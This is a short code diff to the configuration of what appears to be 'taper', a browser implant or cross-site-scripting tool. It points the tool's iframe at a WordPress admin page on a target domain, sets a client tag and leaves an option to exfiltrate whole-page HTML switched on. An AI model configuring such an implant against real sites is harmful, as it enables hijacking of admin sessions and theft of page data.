@@ -86,8 +86,8 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-		window.taperstartingPage = "https://127.0.0.1:8443/";
+		window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
+		//window.taperstartingPage = "https://127.0.0.1:8443/";
 	}
 	else // if implant mode
 	{
@@ -105,7 +105,7 @@ function initGlobals()
 
 
 	// Should we set an optional client tag?
-	window.taperTag = "";
+	window.taperTag = "test";
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
